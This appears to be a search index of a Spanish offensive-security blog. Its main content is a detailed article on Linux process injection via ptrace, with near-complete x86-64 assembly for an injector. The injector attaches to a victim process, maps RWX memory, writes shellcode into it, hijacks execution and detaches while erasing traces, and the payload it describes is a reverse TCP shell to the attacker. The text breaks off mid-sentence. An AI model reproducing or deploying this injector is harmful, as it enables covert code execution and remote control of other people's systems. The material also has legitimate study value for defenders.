{"config":{"lang":["es"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"RAZOR","text":"Offensive Security <p>       Notas t\u00e9cnicas sobre seguridad ofensiva y desarrollo de malware.     </p> <p>       Reconocimiento \u00b7 Intrusi\u00f3n \u00b7 Evasi\u00f3n \u00b7 Exfiltraci\u00f3n \u00b7 Persistencia     </p>"},{"location":"#secciones","title":"Secciones","text":"Malware Development Desarrollo y Explicaci\u00f3n de T\u00e9cnicas Ofensivas Low-level"},{"location":"#ultimos-posts","title":"\u00daltimos posts","text":"Process Injection via Ptrace Inyecci\u00f3n de shellcode en procesos Linux usando Ptrace sin dependencias Assembly \u2605 120 min Reverse TCP Shell Reverse TCP Shell sin dependencias Assembly 5 min"},{"location":"research/malware-dev/","title":"Malware Development","text":"<p>Desarrollo y explicaci\u00f3n de t\u00e9cnicas ofensivas implementadas a bajo nivel.</p>"},{"location":"research/malware-dev/#articulos","title":"Art\u00edculos","text":"Process Injection via Ptrace Inyecci\u00f3n de shellcode en procesos Linux usando Ptrace sin dependencias Assembly \u2605 120 min Reverse TCP Shell Reverse TCP Shell en ensamblador x86-64 usando \u00fanicamente syscalls Assembly 5 min"},{"location":"research/malware-dev/ptrace-injection/","title":"Process Injection via Ptrace","text":"Process Injection via Ptrace 01/02/2026 \u00b7 120 min <p>Inyecci\u00f3n de c\u00f3digo en procesos Linux usando <code>ptrace</code>, implementado completamente en ensamblador x86-64. Sin dependencias.</p> <p>Uso responsable</p> <p>El contenido de este sitio web se publica exclusivamente con fines educativos e informativos. El autor no promueve, respalda ni se hace responsable del uso indebido o ilegal de la informaci\u00f3n aqu\u00ed expuesta. Cualquier acci\u00f3n realizada a partir de este contenido debe llevarse a cabo \u00fanicamente en entornos controlados, sistemas propios o con autorizaci\u00f3n expresa y verificable del propietario del sistema.</p>"},{"location":"research/malware-dev/ptrace-injection/#introduccion","title":"Introducci\u00f3n","text":"<p>En esta t\u00e9cnica un proceso (tracer) toma el control de otro proceso en ejecuci\u00f3n (tracee) para inyectar y ejecutar c\u00f3digo arbitrario dentro de su espacio de direcciones. En Linux, el mecanismo que lo hace posible es la syscall <code>ptrace</code>, la misma que utilizan internamente depuradores como GDB o herramientas de trazado como <code>strace</code>.</p> <p>La idea general es sencilla, adjuntarnos al proceso v\u00edctima, pausar su ejecuci\u00f3n, reservar memoria ejecutable dentro de su espacio de direcciones, copiar nuestro shellcode en esa memoria y redirigir el flujo de ejecuci\u00f3n hacia \u00e9l.</p> <p>La explotaci\u00f3n constar\u00e1 de dos componentes:</p> <ul> <li><code>proc_inj.asm</code>: El programa inyector. Se encarga de adjuntarse al proceso v\u00edctima, reservar memoria, copiar el shellcode y redirigir la ejecuci\u00f3n.</li> <li><code>proc_inj_rev_tcp.asm</code>: En este caso, se trata de una reverse TCP shell modificada que, tras la inyecci\u00f3n, crea un proceso hijo encargado de establecer la conexi\u00f3n con el atacante, mientras que el proceso padre retoma la ejecuci\u00f3n del proceso infectado.</li> </ul>"},{"location":"research/malware-dev/ptrace-injection/#la-syscall-ptrace","title":"La syscall <code>PTRACE</code>","text":"<p>Todas las operaciones relevantes sobre el proceso v\u00edctima se realizan a trav\u00e9s de la syscall <code>ptrace</code> (process trace) (n\u00famero 101 en x86-64). Aunque fue dise\u00f1ada originalmente para implementar depuradores y herramientas de diagn\u00f3stico, su capacidad de manipular completamente la ejecuci\u00f3n de un proceso la convierte tambi\u00e9n en un vector de ataque.</p> <p>A nivel de kernel, cuando un proceso se vincula a otro mediante <code>ptrace</code>, se establece una relaci\u00f3n especial entre ambos. El kernel marca al tracee con un flag interno (<code>PT_PTRACED</code>) indicando que est\u00e1 siendo trazado. A partir de ese momento, ciertos puntos de ejecuci\u00f3n pasan a estar mediados por el tracer. Cuando el tracee alcanza uno de estos puntos, en lugar de continuar su ejecuci\u00f3n normal, el kernel lo detiene y coloca en un estado de pausa controlada (ptrace-stop), donde permanece suspendido hasta que el tracer decida reanudarlo.</p> <p>El tracer es notificado de estas paradas mediante el mecanismo <code>wait*</code>, que reutiliza el sistema est\u00e1ndar de espera entre procesos de Linux para indicarle la raz\u00f3n de la detenci\u00f3n. Mientras el tracee est\u00e1 detenido, el tracer puede inspeccionar o modificar su estado completo (registros/memoria) y decidir c\u00f3mo continuar la ejecuci\u00f3n.</p>"},{"location":"research/malware-dev/ptrace-injection/#que-permite-hacer-ptrace","title":"\u00bfQu\u00e9 permite hacer <code>PTRACE</code>?","text":"<p>Las capacidades del tracer sobre el proceso tracee son las siguientes:</p> <ul> <li>Leer y escribir memoria: Acceso directo al espacio de direcciones del tracee. Permite examinar el c\u00f3digo que est\u00e1 ejecutando, inspeccionar variables en el stack o el heap y escribir datos o instrucciones en cualquier direcci\u00f3n mapeada.</li> <li>Leer y escribir registros del CPU: Acceso completo a todos los registros del procesador. Esto permite conocer exactamente en qu\u00e9 punto de ejecuci\u00f3n se encuentra el tracee y manipular el flujo de control modificando el instruction pointer y/o los argumentos de las syscalls.</li> <li>Controlar la ejecuci\u00f3n instrucci\u00f3n por instrucci\u00f3n: Con operaciones como <code>PTRACE_SINGLESTEP</code>, el tracer puede ejecutar exactamente una instrucci\u00f3n del tracee y detenerlo de nuevo, permitiendo observar los cambios que produce cada instrucci\u00f3n individual.</li> <li>Interceptar syscalls: El tracer puede ser notificado cada vez que el tracee entra o sale de una syscall, permitiendo inspeccionar o modificar los argumentos y valores de retorno. Esta es la base de herramientas como <code>strace</code>.</li> <li>Interceptar se\u00f1ales: El tracer recibe las se\u00f1ales dirigidas al tracee antes de que este las procese, pudiendo suprimirlas, modificarlas o inyectar nuevas se\u00f1ales.</li> </ul>"},{"location":"research/malware-dev/ptrace-injection/#argumentos-de-entrada","title":"Argumentos de Entrada","text":"<pre><code>rax = 101        ; n\u00famero de syscall (__NR_ptrace)\nrdi = request    ; operaci\u00f3n (PTRACE_*)\nrsi = pid        ; PID del proceso objetivo\nrdx = addr       ; direcci\u00f3n (puntero)\nr10 = data       ; dato/direcci\u00f3n (puntero)\n</code></pre> <p>Las operaciones de <code>ptrace</code> usadas son:</p> Operaci\u00f3n Valor Descripci\u00f3n <code>PTRACE_ATTACH</code> 16 El tracer se adjunta al proceso con PID indicado en <code>pid</code>. El kernel env\u00eda <code>SIGSTOP</code> al tracee. Se requiere <code>wait4</code> para esperar la detenci\u00f3n efectiva. <code>PTRACE_PEEKDATA</code> 2 Lee 8 bytes de la memoria del tracee en la direcci\u00f3n <code>addr</code>. El valor le\u00eddo se almacena en la direcci\u00f3n apuntada por <code>data</code>. <code>PTRACE_POKEDATA</code> 5 Escribe el valor de <code>data</code> (8 bytes) en la memoria del tracee en la direcci\u00f3n <code>addr</code>. <code>PTRACE_SINGLESTEP</code> 9 Reanuda la ejecuci\u00f3n del tracee pero lo detiene de nuevo tras ejecutar una sola instrucci\u00f3n. Requiere <code>wait4</code> despu\u00e9s para sincronizarse. <code>PTRACE_GETREGS</code> 12 Copia todos los registros del CPU del tracee en un buffer proporcionado por el tracer (a trav\u00e9s de <code>data</code>), siguiendo el layout de <code>user_regs_struct</code>. <code>PTRACE_SETREGS</code> 13 Establece todos los registros del CPU del tracee desde un buffer proporcionado por el tracer (a trav\u00e9s de <code>data</code>). <code>PTRACE_DETACH</code> 17 El tracer se desadjunta del tracee, eliminando el flag <code>PT_PTRACED</code>. El que era el tracee reanuda su ejecuci\u00f3n."},{"location":"research/malware-dev/ptrace-injection/#estructura-user_regs_struct","title":"Estructura <code>user_regs_struct</code>","text":"<p>Cuando se usa <code>PTRACE_GETREGS</code> o <code>PTRACE_SETREGS</code>, se trabaja con una estructura de 27 campos de 8 bytes (216 bytes en total) que contiene todos los registros del CPU. El orden de los campos y sus offsets es fundamental para manipular registros espec\u00edficos:</p> Offset Registro <code>0x00</code> <code>R15</code> <code>0x08</code> <code>R14</code> <code>0x10</code> <code>R13</code> <code>0x18</code> <code>R12</code> <code>0x20</code> <code>RBP</code> <code>0x28</code> <code>RBX</code> <code>0x30</code> <code>R11</code> <code>0x38</code> <code>R10</code> <code>0x40</code> <code>R9</code> <code>0x48</code> <code>R8</code> <code>0x50</code> <code>RAX</code> <code>0x58</code> <code>RCX</code> <code>0x60</code> <code>RDX</code> <code>0x68</code> <code>RSI</code> Offset Registro <code>0x70</code> <code>RDI</code> <code>0x78</code> <code>ORIG_RAX</code> <code>0x80</code> <code>RIP</code> <code>0x88</code> <code>CS</code> <code>0x90</code> <code>EFLAGS</code> <code>0x98</code> <code>RSP</code> <code>0xA0</code> <code>SS</code> <code>0xA8</code> <code>FS_BASE</code> <code>0xB0</code> <code>GS_BASE</code> <code>0xB8</code> <code>DS</code> <code>0xC0</code> <code>ES</code> <code>0xC8</code> <code>FS</code> <code>0xD0</code> <code>GS</code>"},{"location":"research/malware-dev/ptrace-injection/#explicacion-del-inyector-paso-a-paso","title":"Explicaci\u00f3n del Inyector Paso a Paso","text":""},{"location":"research/malware-dev/ptrace-injection/#seccion-de-datos","title":"Secci\u00f3n de Datos","text":"<p>La secci\u00f3n <code>.data</code> del inyector contiene el shellcode. Este shellcode es la versi\u00f3n compilada de <code>proc_inj_rev_tcp.asm</code> (explicado m\u00e1s adelante en este art\u00edculo), pero podr\u00eda ser el que quisiera el atacante.</p> <p>La secci\u00f3n <code>.bss</code> reserva tres buffers de 216 bytes cada uno (27 registros x 8 bytes):</p> <ul> <li><code>regs</code>: Buffer de trabajo donde se cargan y modifican los registros del tracee.</li> <li><code>regs_ori</code>: Copia de respaldo de los registros originales del tracee.</li> <li><code>regs_sys</code>: Buffer auxiliar para capturar el resultado de la syscall <code>mmap</code> ejecutada en el tracee.</li> </ul>"},{"location":"research/malware-dev/ptrace-injection/#attach-y-detencion-del-proceso","title":"Attach y Detenci\u00f3n del Proceso","text":"<p>El PID del proceso objetivo se almacena previamente en un registro.</p> <pre><code>; 1 Attach y detenci\u00f3n del proceso\n\n    ; PTRACE_ATTACH\n    mov rax, 101\n    mov rdi, 16          ; PTRACE_ATTACH (0x10)\n    mov rsi, r15         ; PID\n    xor rdx,rdx          ; addr\n    xor r10, r10         ; data\n    syscall\n\n    ; WAIT4: \n        ; Cuando se hace PTRACE_ATTACH, el kernel env\u00eda SIGSTOP al proceso objetivo. \n        ; Es necesario llamar a wait4 para bloquear al tracer hasta que el proceso tracee  \n        ; est\u00e9 efectivamente detenido antes de poder manipularlo.\n\n        mov rax, 61\n        mov rdi, r15            ; PID a esperar (-1 para cualquier hijo)\n        sub rsp, 8\n        mov rsi, rsp            ; &amp;status\n        xor rdx, rdx            ; options\n        xor r10, r10            ; rusage\n        syscall\n</code></pre> <p>El primer paso es adjuntarse al proceso v\u00edctima usando <code>PTRACE_ATTACH</code> (operaci\u00f3n 16). </p> <p>Cuando el kernel recibe esta solicitud, env\u00eda una se\u00f1al <code>SIGSTOP</code> al proceso tracee, lo que provoca su detenci\u00f3n. Sin embargo, esta detenci\u00f3n no es instant\u00e1nea, el proceso necesita tiempo para procesar la se\u00f1al y detenerse efectivamente. Por eso es imprescindible llamar a <code>wait4</code> (syscall n\u00famero 61) inmediatamente despu\u00e9s. Esta llamada bloquea al tracer hasta que el tracee est\u00e9 completamente detenido y listo para ser manipulado.</p> <p>Sin la ejecuci\u00f3n de la syscall <code>wait4</code>, cualquier operaci\u00f3n posterior sobre el tracee podr\u00eda fallar o producir resultados impredecibles porque el proceso a\u00fan no estar\u00eda detenido correctamente. </p>"},{"location":"research/malware-dev/ptrace-injection/#preservacion-del-contexto-de-ejecucion","title":"Preservaci\u00f3n del Contexto de Ejecuci\u00f3n","text":"<pre><code>; 2 Preservaci\u00f3n del contexto de ejecuci\u00f3n\n\n    ; PTRACE_GETREGS\n    mov rax, 101\n    mov rdi, 12   ; PTRACE_GETREGS\n    mov rsi, r15  ; PID\n    xor rdx, rdx  ; addr\n    lea r10, [rel regs] ; puntero al buffer donde se va almacenar la estructura de registros\n    syscall\n\n    ; Copia de los registros originales del traceee en el buffer de backup\n    lea rsi, [rel regs]       ; RSI se usa como puntero de origen y va avanzando\n    lea rdi, [rel regs_ori]   ; RDI se usa como puntero destino y va avanzando\n\n    mov rcx, 27               ; RCX se usa como contador y se va decrementando hasta 0\n    cld                       ; DF=0 (direcci\u00f3n de copia ascendente)\n    rep movsq                 ; mueve RCX qwords: [RSI] -&gt; [RDI]\n\n                    ; movsq copia un qword (8 bytes) desde la direcci\u00f3n apuntada por RSI hacia la direcci\u00f3n apuntada por RDI   \n                    ; rep repite esa operaci\u00f3n RCX veces\n</code></pre> <p>Con <code>PTRACE_GETREGS</code> (operaci\u00f3n 12) obtenemos una instant\u00e1nea completa de todos los registros del CPU del proceso tracee en el momento de su detenci\u00f3n. Esta informaci\u00f3n se almacenar\u00e1 en un buffer siguiendo la arquitectura de <code>user_regs_struct</code>.</p> <p>A continuaci\u00f3n, se realiza una copia de respaldo de esta estructura en otro buffer. Este backup es importante porque durante el proceso de inyecci\u00f3n vamos a modificar los registros del tracee para ejecutar una syscall en su contexto. Sin esta copia, no podr\u00edamos restaurar el estado original del proceso despu\u00e9s de la inyecci\u00f3n.</p>"},{"location":"research/malware-dev/ptrace-injection/#inyeccion-de-la-instruccion-syscall","title":"Inyecci\u00f3n de la Instrucci\u00f3n Syscall","text":"<pre><code>; 3 Inyecci\u00f3n de la instrucci\u00f3n syscall (0x0f 0x05)\n\n    mov r12, [regs+0x80]   ; Contenido del RIP del proceso tracee (direcci\u00f3n de la pr\u00f3xima instrucci\u00f3n a ejecutar)\n\n    ; PTRACE_PEEKDATA (leer memoria) Se leen 8 bytes a partir de la direcci\u00f3n actual a la que apunta el RIP del proceso tracee\n    mov rax, 101\n    mov rdi, 2       ; PTRACE_PEEKDATA\n    mov rsi, r15     ; PID\n    mov rdx, r12     ; addr\n    sub rsp, 8       ; 8 bytes\n    mov r10, rsp     ; puntero a data (direccion donde se almacenar\u00e1 la info le\u00edda)\n    syscall \n\n    mov r11, [rsp] ; En r11 y en el tope del stack se encuentra el valor al que apunta RIP del tracee\n    mov r13, r11 ; Backup del valor original\n    and r11, 0xFFFFFFFFFFFF0000 ; limpiar los 2 bytes bajos\n    or r11, 0x000000000000050F  ; insertar syscall (0x0f 0x05 en little-endian)\n\n    ; PTRACE_POKEDATA (escribir en memoria)\n    mov rax, 101\n    mov rdi, 5     ; PTRACE_POKEDATA\n    mov rsi, r15   ; PID\n    mov rdx, r12   ; addr \n    mov r10, r11   ; valor de 8 bytes a escribir\n    syscall\n</code></pre> <p>Aqu\u00ed es donde comienza la parte interesante. El primer objetivo es hacer que el proceso tracee ejecute una syscall en particular, concretamente <code>mmap</code>,  para reservar memoria ejecutable en el heap del proceso, este ser\u00e1 el espacio que ocupar\u00e1 nuestro shellcode. Para ello, necesitamos que en la direcci\u00f3n a la que apunta el <code>RIP</code> del tracee exista una instrucci\u00f3n <code>syscall</code> (opcode <code>0x0F 0x05</code>).</p> <p>El proceso es el siguiente:</p> <ol> <li>Se extrae la direcci\u00f3n actual a la que apunta el registro <code>RIP</code> del tracee desde el buffer de registros (<code>regs+0x80</code>). Esta es la direcci\u00f3n de la pr\u00f3xima instrucci\u00f3n que el tracee iba a ejecutar antes de ser detenido.</li> <li>Con <code>PTRACE_PEEKDATA</code> (operaci\u00f3n 2) se leen los 8 bytes que hay en esa direcci\u00f3n de memoria del tracee. Estos bytes son instrucciones que el tracee estaba a punto de ejecutar.</li> <li>Se guarda una copia del valor original (lo necesitaremos despu\u00e9s para restaurar). Luego se modifican solo los 2 bytes menos significativos del valor le\u00eddo, reemplaz\u00e1ndolos por <code>0x0F 0x05</code> (el opcode de la instrucci\u00f3n <code>syscall</code> en x86-64). La m\u00e1scara <code>AND 0xFFFFFFFFFFFF0000</code> limpia los 2 bytes bajos y el <code>OR 0x050F</code> inserta el opcode en little-endian.</li> <li>Con <code>PTRACE_POKEDATA</code> (operaci\u00f3n 5) se escribe el valor modificado de vuelta en la memoria del tracee, sobreescribiendo temporalmente las instrucciones originales con una instrucci\u00f3n <code>syscall</code>.</li> </ol>"},{"location":"research/malware-dev/ptrace-injection/#configuracion-de-registros-para-mmap","title":"Configuraci\u00f3n de Registros para <code>MMAP</code>","text":"<pre><code>; 4 Configuraci\u00f3n de registros para MMAP\n\n    ; MMAP\n\n        mov qword [regs+0x50], 9       ; (RAX) Se sustituye todo el valor del registro       N\u00famero de syscall para mmap\n        mov qword [regs+0x70],0        ; (RDI)       rdi = addr = 0 (NULL) \u2192 Pide al kernel que elija la direcci\u00f3n\n        mov qword [regs+0x68],4096     ; (RSI)       rsi = length = 4096 bytes (1 p\u00e1gina t\u00edpica)\n        mov qword [regs+0x60],7        ; (RDX)       rdx = prot = 7 =&gt; PROT_READ(1) | PROT_WRITE(2) | PROT_EXEC(4)\n        mov qword [regs+0x38],34       ; (R10)       r10 = flags = 34 =&gt; MAP_PRIVATE(0x2) | MAP_ANONYMOUS(0x20)\n        mov qword [regs+0x48],-1       ; (R8)        r8 = fd = -1 (usado con MAP_ANONYMOUS; -1 indica \"no file\")\n        mov qword [regs+0x40],0        ; (R9)        r9 = offset = 0 (desplazamiento en el fd; irrelevante con ANONYMOUS)\n\n    ; PTRACE_SETREGS\n        mov rax, 101\n        mov rdi, 13    ; PTRACE_SETREGS\n        mov rsi, r15   ; PID\n        xor rdx, rdx   ; addr\n        lea r10, [rel regs] ; puntero al buffer donde se encuentra la estructura de registros\n        syscall\n</code></pre> <p>Ahora que tenemos una instrucci\u00f3n <code>syscall</code> lista en el punto de ejecuci\u00f3n del tracee, necesitamos configurar sus registros para que esa syscall ejecute exactamente lo que queremos, una llamada a <code>mmap</code> que reserve una p\u00e1gina de memoria con permisos de lectura, escritura y ejecuci\u00f3n (RWX).</p> <p>Los registros se modifican directamente en nuestro buffer usando los offsets correspondientes y luego se aplican los cambios en el tracee con <code>PTRACE_SETREGS</code>:</p> <pre><code>rax = 9          ; n\u00famero de syscall (mmap)\nrdi = addr       ; direcci\u00f3n sugerida (0 = el kernel elige)\nrsi = length     ; tama\u00f1o del mapeo en bytes\nrdx = prot       ; protecciones: PROT_READ|PROT_WRITE|PROT_EXEC...\nr10 = flags      ; MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED...\nr8  = fd         ; descriptor (si MAP_ANONYMOUS, t\u00edpicamente -1)\nr9  = offset     ; offset en el fichero (en bytes, m\u00faltiplo de p\u00e1gina)\n</code></pre> <p>La combinaci\u00f3n <code>MAP_PRIVATE | MAP_ANONYMOUS</code> indica al kernel que cree una regi\u00f3n de memoria privada, no respaldada por ning\u00fan archivo en disco. Los permisos RWX son necesarios porque vamos a escribir el shellcode en esta regi\u00f3n y luego ejecutarlo.</p>"},{"location":"research/malware-dev/ptrace-injection/#ejecucion-controlada-de-la-syscall-mmap","title":"Ejecuci\u00f3n Controlada de la Syscall <code>MMAP</code>","text":"<pre><code>; 5 Ejecuci\u00f3n controlada de la syscall MMAP\n\n    ;PTRACE_SINGLESTEP\n    mov rax, 101\n    mov rdi, 9       ; PTRACE_SINGLESTEP\n    mov rsi, r15     ; PID\n    xor rdx, rdx     ; addr\n    xor r10, r10     ; data\n    syscall\n\n    ; WAIT4: \n    mov rax, 61\n    mov rdi, r15            ; PID a esperar (-1 para cualquier hijo)\n    sub rsp, 8\n    mov rsi, rsp            ; &amp;status\n    xor rdx, rdx            ; options\n    xor r10, r10            ; rusage\n    syscall\n\n    ; PTRACE_GETREGS\n    mov rax, 101\n    mov rdi, 12   ; PTRACE_GETREGS\n    mov rsi, r15  ; PID\n    xor rdx, rdx  ; addr\n    lea r10, [rel regs_sys] ; puntero al buffer donde se va almacenar la estructura de registros\n    syscall\n\n  ; 6 Obtenci\u00f3n del resultado de la syscall MMAP\n    xor r12, r12 \n    mov r12, [regs_sys+0x50]       ; (RAX) direcci\u00f3n donde comienza la zona de memoria reservada com permisos RWX\n</code></pre> <p>Con los registros del tracee configurados y la instrucci\u00f3n <code>syscall</code> en su lugar, usamos <code>PTRACE_SINGLESTEP</code> (operaci\u00f3n 9) para ejecutar exactamente una instrucci\u00f3n en el contexto del tracee. Esa instrucci\u00f3n es el <code>syscall</code> que inyectamos en el paso 3, que con los registros modificados del paso 4, ejecutar\u00e1 <code>mmap</code>.</p> <p>Posteriormente, usamos <code>PTRACE_GETREGS</code> para obtener el estado de los registros despu\u00e9s de la ejecuci\u00f3n de la syscall. El valor de retorno de <code>mmap</code> quedar\u00e1 almacenado en el registro <code>RAX</code> del tracee. Este valor es la direcci\u00f3n base de la nueva regi\u00f3n de memoria con permisos RWX que el kernel ha asignado dentro del espacio de direcciones del proceso objetivo.</p> <p>El motivo de usar un buffer diferente es simple, <code>regs</code> ya fue modificado en el paso 4 (los registros para el <code>mmap</code>) y <code>regs_ori</code> contiene los registros originales que necesitamos preservar intactos. <code>regs_sys</code> nos permite capturar el resultado de <code>mmap</code> sin contaminar ninguno de los dos. </p>"},{"location":"research/malware-dev/ptrace-injection/#restauracion-del-contenido-en-la-direccion-apuntada-por-rip","title":"Restauraci\u00f3n del Contenido en la Direcci\u00f3n Apuntada por <code>RIP</code>","text":"<pre><code>; 7 Restauraci\u00f3n del contenido ubicado en la direcci\u00f3n a la que apunta el registro RIP del tracee\n\n        xor r14, r14\n        mov r14, [regs_ori+0x80]\n\n        ; PTRACE_POKEDATA (escribir en memoria)\n        mov rax, 101\n        mov rdi, 5     ; PTRACE_POKEDATA\n        mov rsi, r15   ; PID\n        mov rdx, r14   ; addr \n        mov r10, r13   ; valor de 8 bytes a escribir\n        syscall\n</code></pre> <p>En el paso 3, sobreescribimos los bytes originales ubicados en la direcci\u00f3n apuntada por el registro <code>RIP</code>. Ahora que ya ejecutamos <code>mmap</code>, es momento de restaurar esos bytes originales para no dejar rastro de nuestra manipulaci\u00f3n.</p> <p>Se obtiene la direcci\u00f3n original del <code>RIP</code> desde <code>regs_ori+0x80</code> y se usa <code>PTRACE_POKEDATA</code> para escribir de vuelta el valor original. Tras esta operaci\u00f3n, la memoria del tracee en ese punto vuelve a contener exactamente las mismas instrucciones que ten\u00eda antes de la intervenci\u00f3n.</p>"},{"location":"research/malware-dev/ptrace-injection/#restauracion-de-los-registros-originales","title":"Restauraci\u00f3n de los Registros Originales","text":"<pre><code>; 8 Restauraci\u00f3n de los registros originales del proceso tracee\n        ; PTRACE_SETREGS\n        mov rax, 101\n        mov rdi, 13    ; PTRACE_SETREGS\n        mov rsi, r15   ; PID\n        xor rdx, rdx   ; addr\n        lea r10, [rel regs_ori] ; puntero al buffer donde se encuentra la estructura de registros\n        syscall\n</code></pre> <p>Con <code>PTRACE_SETREGS</code> se restauran todos los registros del tracee a su estado original usando el backup <code>regs_ori</code>. Esto devuelve al tracee a exactamente el mismo estado en el que se encontraba cuando lo detuvimos.</p> <p>Esto es importante porque en los pasos posteriores vamos a modificar selectivamente solo el registro <code>RIP</code> (para redirigir la ejecuci\u00f3n al shellcode) y el <code>orig_rax</code> (para evitar el reinicio de syscalls). </p>"},{"location":"research/malware-dev/ptrace-injection/#almacenamiento-del-rip-de-retorno","title":"Almacenamiento del <code>RIP</code> de Retorno","text":"<pre><code>; 9 Almacenamiento del RIP de retorno en los \u00faltimos 8 bytes de la regi\u00f3n de memoria reservada por MMAP\n\n        ; PTRACE_POKEDATA (escribir en memoria)\n        mov rax, 101\n        mov rdi, 5     ; PTRACE_POKEDATA\n        mov rsi, r15   ; PID\n        lea rdx, [r12+4088]   ; addr \n        mov r10, r14   ; valor de 8 bytes a escribir\n        syscall\n</code></pre> <p>Este paso es clave para que la inyecci\u00f3n sea transparente, el proceso tracee debe poder retomar su ejecuci\u00f3n despu\u00e9s de que el shellcode haga su trabajo.</p> <p>La regi\u00f3n de memoria reservada por <code>mmap</code> tiene 4096 bytes (seg\u00fan lo asignado en los argumentos de entrada). El shellcode se escribir\u00e1 desde el inicio de esta regi\u00f3n, pero los \u00faltimos 8 bytes (<code>offset+4088</code>) se reservar\u00e1n para almacenar la direcci\u00f3n de retorno (el valor original del registro  <code>RIP</code> del tracee).</p> <p>Cuando el shellcode se ejecute en el contexto del tracee, har\u00e1 <code>fork</code> (crea un proceso hijo duplicando el proceso actual). El proceso hijo ejecutar\u00e1 la reverse shell, pero el proceso padre necesita saber a d\u00f3nde volver. El padre leer\u00e1 esta direcci\u00f3n desde <code>[_start + 4088]</code> (que equivale a <code>mmap_base + 4088</code>) y saltar\u00e1 a ella, retomando la ejecuci\u00f3n exactamente donde se hab\u00eda detenido.</p> <pre><code>Regi\u00f3n RWX (4096 bytes):\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              Shellcode (bytes 0..4087)           \u2502 RIP ret  \u2502\n\u2502                                                  \u2502 (8 bytes)\u2502\n\u2502  _start \u2192 fork, setsid, socket, connect...       \u2502 4088-4095\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                                                    \u25b2\n                                                    \u2502\n                                        El padre lee esta\n                                        direcci\u00f3n y salta\n</code></pre>"},{"location":"research/malware-dev/ptrace-injection/#inyeccion-del-shellcode","title":"Inyecci\u00f3n del Shellcode","text":"<pre><code>; 10 Inyecci\u00f3n del shellcode en la zona de memoria reservada (PTRACE_POKEDATA escribe 8 bytes)\n\n    xor r13,r13\n    lea r13, [rel shellcode]   ; puntero al shellcode\n    xor r14, r14\n    mov r14, sc_len / 8        ; contador de palabras a escribir\n    push r12\n\n    .loop_inj:\n\n        cmp r14, 0     ; compara el contador de palabras a escribir con 0\n        jz .done       ; si contador == 0, saltar a .done\n\n        ; PTRACE_POKEDATA\n        mov rax, 101\n        mov rdi, 5     ; PTRACE_POKEDATA\n        mov rsi, r15   ; PID\n        mov rdx, r12   ; addr \n        mov r10, [r13] ; valor de 8 bytes a escribir\n        syscall\n\n        add r12, 8\n        add r13, 8\n        dec r14\n        jmp .loop_inj\n</code></pre> <p>Ahora se copia el shellcode completo en la regi\u00f3n de memoria reservada. Dado que <code>PTRACE_POKEDATA</code> escribe exactamente 8 bytes por llamada, debemos iterar <code>sc_len / 8</code> veces (longitud del shellcode dividida entre 8).</p> <p>En cada iteraci\u00f3n:</p> <ul> <li><code>r13</code> apunta a la posici\u00f3n actual dentro del shellcode (en el espacio del tracer).</li> <li><code>r12</code> apunta a la posici\u00f3n actual dentro de la regi\u00f3n generada por <code>mmap</code> (en el espacio del tracee).</li> <li>Se leen 8 bytes desde <code>[r13]</code> y se escriben en <code>[r12]</code> del tracee.</li> <li>Ambos punteros avanzan 8 bytes y el contador <code>r14</code> se decrementa.</li> </ul> <p>El shellcode est\u00e1 alineado a 8 bytes (se a\u00f1aden bytes <code>0x90</code> (NOP) al final si es necesario) para que la \u00faltima escritura de <code>PTRACE_POKEDATA</code> no se salga de los l\u00edmites del shellcode. </p>"},{"location":"research/malware-dev/ptrace-injection/#redirigir-ejecucion-al-inicio-del-shellcode-y-detach","title":"Redirigir Ejecuci\u00f3n al Inicio del Shellcode y Detach","text":"<pre><code>; 11 Redirigir ejecuci\u00f3n al inicio del shellcode\n\n.done\n\n        pop r12\n\n        mov qword [regs_ori+0x80], r12   ; RIP == direcci\u00f3n del inicio de la memoria reservada == inicio del shellcode\n        mov qword [regs_ori+0x78], -1    ; orig_rax = -1 (evita syscall restart)\n\n        ; PTRACE_SETREGS\n        mov rax, 101\n        mov rdi, 13    ; PTRACE_SETREGS\n        mov rsi, r15   ; PID\n        xor rdx, rdx   ; addr\n        lea r10, [rel regs_ori] ; puntero al buffer donde se encuentra la estructura de registros\n        syscall\n\n; 12 Detach del tracee\n\n    ; PTRACE_DETACH\n    mov rax, 101\n    mov rdi, 17    ; PTRACE_DETACH\n    mov rsi, r15   ; PID\n    xor rdx, rdx   ; addr\n    xor r10, r10   ; signal = 0 (no enviar se\u00f1al)\n    syscall\n\n    ; EXIT\n    mov rax, 60\n    xor rdi,rdi \n    syscall\n</code></pre> <p>Con el shellcode ya en su lugar, se realizan las modificaciones finales antes de liberar al tracee.</p> <p>Se modifica el campo <code>RIP</code> en la estructura de registros para que apunte al inicio de la regi\u00f3n definida por <code>mmap</code>, que es donde comienza el shellcode previamente inyectado. Cuando el tracee reanude su ejecuci\u00f3n, lo har\u00e1 desde la primera instrucci\u00f3n del shellcode.</p> <p>Se establece el valor de <code>orig_rax</code>, **usado internamente por el kernel para el mecanismo de syscall restart. Si el tracee fue detenido durante una syscall interrumpida, el kernel podr\u00eda intentar re-ejecutarla autom\u00e1ticamente al reanudar. Establecer <code>orig_rax = -1</code> le dice al kernel que no hay ninguna syscall pendiente de reinicio, evitando comportamientos inesperados.</p> <p>Se aplican los registros modificados con <code>PTRACE_SETREGS</code>.</p> <p>Se libera al tracee con <code>PTRACE_DETACH</code> (operaci\u00f3n 17). Esto reanuda la ejecuci\u00f3n del proceso, que 